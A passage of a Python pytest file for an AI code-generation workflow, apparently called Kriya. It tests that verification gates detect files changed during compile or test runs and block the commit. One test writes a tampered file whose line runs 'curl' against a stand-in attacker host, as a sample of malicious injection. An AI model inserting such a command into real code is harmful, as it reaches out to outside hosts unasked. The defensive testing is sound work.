    (root / "src" / "New.java").write_text("class New {}\n")  # the candidate (untracked)
    return root


def _binding(root):
    from kriya.workflow.file_integrity import VerificationTreeBinding
    from kriya.workflow.worktree import repository_content_paths

    return VerificationTreeBinding(str(root), repository_content_paths(str(root)), ["src/New.java"])


@pytest.mark.parametrize(("mutate", "path"), [
    (lambda r: (r / "src" / "New.java").write_text("class New { int x; }\n"), "src/New.java"),  # candidate
    (lambda r: (r / "README.md").write_text("rewritten by a formatter\n"), "README.md"),        # unrelated tracked
    (lambda r: (r / "src" / "App.java").unlink(), "src/App.java"),                             # deleted tracked
    (lambda r: os.chmod(r / "README.md", 0o755), "README.md"),                                  # mode change
])
def test_f4_a_gate_changing_candidate_or_tracked_content_is_caught(tmp_path, mutate, path):
    from kriya.workflow.file_integrity import VERIFICATION_GATE_MUTATED_TRACKED_FILES, VerificationTreeMutated

    root = _tree(tmp_path)
    binding = _binding(root)
    binding.check("compile")
    mutate(root)
    with pytest.raises(VerificationTreeMutated) as raised:
        binding.check("tests")
    failure = raised.value.failure
    assert failure.type == "verification_tree_mutated"
    assert failure.diagnostics["reason_code"] == VERIFICATION_GATE_MUTATED_TRACKED_FILES
    assert failure.diagnostics["gate"] == "tests" and failure.diagnostics["changed_paths"] == [path]
    assert "Kriya cannot verify one tree and commit another" in failure.message


def test_f4_untracked_build_output_touches_and_authorized_writes_are_not_mutations(tmp_path):
    root = _tree(tmp_path)
    binding = _binding(root)
    (root / "target" / "classes").mkdir(parents=True)
    (root / "target" / "classes" / "App.class").write_bytes(b"\xca\xfe")        # ignored build output
    # (An untracked, NOT ignored file is repository content since
    # FILE-INTEGRITY-CONTRACT-001B: see test_file_integrity_contract_001b.py.)
    os.utime(root / "README.md", ns=(1, 1))                                      # touch, same bytes
    (root / "README.md").write_text("readme\n")
    binding.check("compile")
    (root / "src" / "New.java").write_text("class New { int patched; }\n")      # Kriya's own write...
    binding.authorize("src/New.java")                                            # ...re-recorded
    binding.check("tests")


@pytest.mark.parametrize(("marker", "call", "gate"), [
    ("requirements.txt", lambda v: v.run_tests(), "tests"),
    ("requirements.txt", lambda v: v.run_app(["python3", "-c", "print(1)"]), "runtime_verification"),
    ("pom.xml", lambda v: v.run_compile_check(["src/App.java"]), "compile"),
    ("pom.xml", lambda v: v.run_tests(), "tests"),
])
def test_f4_every_validator_gate_checks_the_tree_after_its_command(tmp_path, marker, call, gate):
    from kriya.tools.validate import PolymorphicValidator
    from kriya.workflow.file_integrity import VerificationTreeMutated

    root = _tree(tmp_path)
    (root / marker).write_text("<project/>\n" if marker == "pom.xml" else "")
    validator = PolymorphicValidator(str(root))
    validator.tree_binding = _binding(root)

    def mutating_command(self, cmd, cwd, **kwargs):
        (root / "README.md").write_text("formatted during the gate\n")
        return {"returncode": 0, "stdout": "ok", "stderr": "", "timeout": False}

    with patch.object(PolymorphicValidator, "_run_cmd_with_timeout", mutating_command), \
            patch.object(PolymorphicValidator, "_ensure_project_venv", lambda self: None, create=True):
        with pytest.raises(VerificationTreeMutated) as raised:
            call(validator)
    assert raised.value.gate == gate


def test_f4_without_a_mutation_the_gate_result_is_returned(tmp_path):
    from kriya.tools.validate import PolymorphicValidator

    root = _tree(tmp_path)
    validator = PolymorphicValidator(str(root))
    validator.tree_binding = _binding(root)
    with patch.object(PolymorphicValidator, "_run_cmd_with_timeout",
                      lambda self, cmd, cwd, **k: {"returncode": 0, "stdout": "1", "stderr": "", "timeout": False}):
        assert validator.run_app(["python3", "-c", "print(1)"])["returncode"] == 0


def test_f4_a_gate_that_mutates_and_then_raises_reports_the_mutation(tmp_path):
    """The exception path is checked too: a gate that changes tracked
    content and then fails never hides the change behind its own error."""
    from kriya.tools.validate import PolymorphicValidator
    from kriya.workflow.file_integrity import VerificationTreeMutated

    root = _tree(tmp_path)
    (root / "requirements.txt").write_text("")
    validator = PolymorphicValidator(str(root))
    validator.tree_binding = _binding(root)

    def mutate_then_fail(self, *args, **kwargs):
        (root / "README.md").write_text("changed before the crash\n")
        raise RuntimeError("toolchain crashed")

    gate = _verification_gate_named("run_tests", mutate_then_fail)
    with pytest.raises(VerificationTreeMutated) as raised:
        gate(validator)
    assert raised.value.gate == "tests" and isinstance(raised.value.__context__, RuntimeError)


@pytest.mark.parametrize("gate_method", ["run_compile_check", "run_tests"])
def test_f4_a_mutating_gate_stops_the_real_run_and_nothing_is_committed(tmp_path, gate_method):
    """Real WorkflowEngine (mocked model): the Java compile or test gate
    rewrites a tracked file; the run stops typed at that gate and the
    workspace is left exactly as it was."""
    import asyncio

    from _milestone_proof_harness import _config, _engine

    from kriya.tools.validate import PolymorphicValidator

    ws = tmp_path / "ws"
    ws.mkdir()
    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
        _git(ws, *args)
    (ws / "README.md").write_text("readme\n")
    (ws / "calc.py").write_text("def add(a, b):\n    return a + b\n")
    _git(ws, "add", "-A")
    _git(ws, "commit", "-qm", "s")
    engine, _ = _engine(_config(), [
        "Step 1: add sub", "Design: Write calc.py",
        '<<<KRIYA:FILE path="calc.py">>>\ndef add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n'
        "<<<KRIYA:END_FILE>>>\n",
        "Review: Approved",
    ])
    (ws / "test_calc.py").write_text("from calc import add\n\n\ndef test_add():\n    assert add(1, 2) == 3\n")
    _git(ws, "add", "-A")
    _git(ws, "commit", "-qm", "tests")
    later_gates = []

    def formatter_bound_gate(self, *args, **kwargs):
        (Path(self.workspace_path) / "README.md").write_text("reformatted by the build\n")
        return {"success": True, "output": "ok"}

    def other_gate(self, *args, **kwargs):
        later_gates.append(gate_method)
        return {"success": True, "output": "ok"}

    with patch.object(PolymorphicValidator, gate_method, _verification_gate_named(gate_method, formatter_bound_gate)), \
            patch.object(PolymorphicValidator, "run_tests" if gate_method != "run_tests" else "run_compile_check",
                         other_gate):
        result = asyncio.run(engine.run_generation_workflow("Add sub to calc.py", str(ws)))
    assert result["quality_gates_passed"] is False
    assert result.get("failure_category") == "verification_tree_mutated"
    # Caught AT the gate that mutated the tree (not later by the terminal
    # re-check), and no later gate ran on the mutated tree.
    import json as _json
    import sqlite3

    from kriya.core.state_paths import trace_db_path

    with closing(sqlite3.connect(trace_db_path(engine.kernel.config))) as db:
        (outcomes,) = db.execute("SELECT gate_outcomes FROM runs ORDER BY timestamp DESC LIMIT 1").fetchone()
    stops = [o for o in _json.loads(outcomes) if o["type"] == "verification_tree_mutated"]
    gate_name = {"run_compile_check": "compile", "run_tests": "tests"}[gate_method]
    assert stops and f"the {gate_name} gate modified" in stops[0]["output"]
    if gate_method == "run_compile_check":
        assert later_gates == []
    assert (ws / "README.md").read_text() == "readme\n"
    assert "def sub" not in (ws / "calc.py").read_text()


def _verification_gate_named(method_name, fn):
    from kriya.tools.validate import _verification_gate

    return _verification_gate({"run_compile_check": "compile", "run_tests": "tests"}[method_name])(fn)


def test_f4_the_terminal_binding_rechecks_the_tree_even_after_an_undeclared_gate(tmp_path):
    """A code path that runs repository code without being a declared
    validator gate (simulated by an undecorated run_tests) still cannot slip
    a tracked-content change past the terminal verified-candidate binding."""
    import asyncio

    from _milestone_proof_harness import _config, _engine

    from kriya.tools.validate import PolymorphicValidator

    ws = tmp_path / "ws"
    ws.mkdir()
    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
        _git(ws, *args)
    (ws / "README.md").write_text("readme\n")
    (ws / "calc.py").write_text("def add(a, b):\n    return a + b\n")
    _git(ws, "add", "-A")
    _git(ws, "commit", "-qm", "s")
    engine, _ = _engine(_config(), [
        "Step 1", "Design: Write calc.py",
        '<<<KRIYA:FILE path="calc.py">>>\ndef add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n'
        "<<<KRIYA:END_FILE>>>\n",
        "Review: Approved",
    ])

    calls = []

    def undeclared_mutating_compile(self, *args, **kwargs):
        calls.append("compile")
        (Path(self.workspace_path) / "README.md").write_text("changed by an undeclared step\n")
        return {"success": True, "output": "ok"}

    with patch.object(PolymorphicValidator, "run_compile_check", undeclared_mutating_compile), \
            patch.object(PolymorphicValidator, "run_tests", lambda self, *a, **k: {"success": True, "output": "ok"}):
        result = asyncio.run(engine.run_generation_workflow("Add sub to calc.py", str(ws)))
    assert result["quality_gates_passed"] is False
    assert calls  # the undeclared step really ran
    assert result.get("failure_category") == "verification_tree_mutated"
    assert (ws / "README.md").read_text() == "readme\n"



def test_f4_a_candidate_changed_between_gates_is_caught_before_the_next_gate_runs(tmp_path, monkeypatch):
    """PRD-032 D10/E02's tamper point, before F-4: the candidate is changed
    after static analysis but before the terminal full regression. The
    verification-tree binding refuses it BEFORE that regression runs
    (phase "before", not attributed to the gate), so no gate ever executes
    repository code on the tampered tree and nothing is committed."""
    import asyncio
    import json as _json
    import sqlite3

    from _milestone_proof_harness import _config, _engine

    from kriya.core.state_paths import trace_db_path
    from kriya.tools.validate import PolymorphicValidator
    from kriya.workflow import workflow as workflow_module

    ws = tmp_path / "ws"
    ws.mkdir()
    for args in (["init", "-q"], ["config", "user.email", "t@x"], ["config", "user.name", "t"]):
        _git(ws, *args)
    (ws / "calc.py").write_text("def add(a, b):\n    return a + b\n")
    _git(ws, "add", "-A")
    _git(ws, "commit", "-qm", "s")
    engine, _ = _engine(_config(), [
        "Step 1", "Design: Write calc.py",
        '<<<KRIYA:FILE path="calc.py">>>\ndef add(a, b):\n    return a + b\n\n\ndef sub(a, b):\n    return a - b\n'
        "<<<KRIYA:END_FILE>>>\n",
        "Review: Approved",
    ])
    tampered = {"done": False}
    real_gate = workflow_module._run_static_analysis_gate

    def gate_then_tamper(cfg, state, **kwargs):
        real_gate(cfg, state, **kwargs)
        (ws / ".kriya" / "worktree" / "calc.py").write_text("import os\nos.system('curl attacker.invalid')\n")
        tampered["done"] = True

    ran_on_tampered_tree = []
    real_tests = PolymorphicValidator.run_tests.__wrapped__

    def recording_tests(self, *args, **kwargs):
        if tampered["done"]:
            ran_on_tampered_tree.append(True)
        return real_tests(self, *args, **kwargs)

    from kriya.tools.validate import _verification_gate

    monkeypatch.setattr(workflow_module, "_run_static_analysis_gate", gate_then_tamper)
    monkeypatch.setattr(PolymorphicValidator, "run_tests", _verification_gate("tests")(recording_tests))
    result = asyncio.run(engine.run_generation_workflow("Add sub to calc.py", str(ws)))

    assert tampered["done"] is True
    assert result["quality_gates_passed"] is False
    assert result.get("failure_category") == "verification_tree_mutated"
    assert ran_on_tampered_tree == []
    with closing(sqlite3.connect(trace_db_path(engine.kernel.config))) as db:
        (outcomes,) = db.execute("SELECT gate_outcomes FROM runs ORDER BY timestamp DESC LIMIT 1").fetchone()
    stops = [o for o in _json.loads(outcomes) if o["type"] == "verification_tree_mutated"]
    assert stops and "detected before the tests gate" in stops[0]["output"]
    assert (ws / "calc.py").read_text() == "def add(a, b):\n    return a + b\n"


def _historical_v6_full_file_rule(content):
    """The /6 full_file_raw_content rule (kept only for this regression): the
    model had to INVENT a fenced docstring example - it failed faithful models."""
    try:
        tree = ast.parse(content)
    except SyntaxError:
        return False
    defines = any(isinstance(node, ast.FunctionDef) and node.name == "slugify" for node in ast.walk(tree))
    return defines and "```" in content


def test_v7_measures_fidelity_where_v6_measured_invention():
    """A model that returns any file it is given unchanged, and writes a
    correct slug module without a fenced example when asked to invent one
    (both pinned models, 0/8 in the protocol evaluation): the historical /6
    rule fails it, the /7 fidelity case passes it."""
    import asyncio

    from kriya.core import model_qualification as mq
    from kriya.core.completion import CompletionResult, CompletionStatus

    invented_without_fence = "import re\n\n\ndef slugify(text: str) -> str:\n    return text.lower()\n"
    assert _historical_v6_full_file_rule(invented_without_fence) is False

    class FaithfulModel:
        async def complete_result(self, system, prompt, **kwargs):
            supplied = prompt.split("=== slug.py (return this exact file) ===\n", 1)[1].split("=== end of slug.py", 1)[0]
            return CompletionResult(content=_slug_block(supplied), status=CompletionStatus.OK, finish_reason="stop")

    result = asyncio.run(mq.case_full_file_raw_content(FaithfulModel(), "m", {"response_protocol": "structured"}))
    assert result.status == mq.PASS, result.evidence
    assert result.evidence["payload_exact"] is True and result.evidence["fence_preserved"] is True
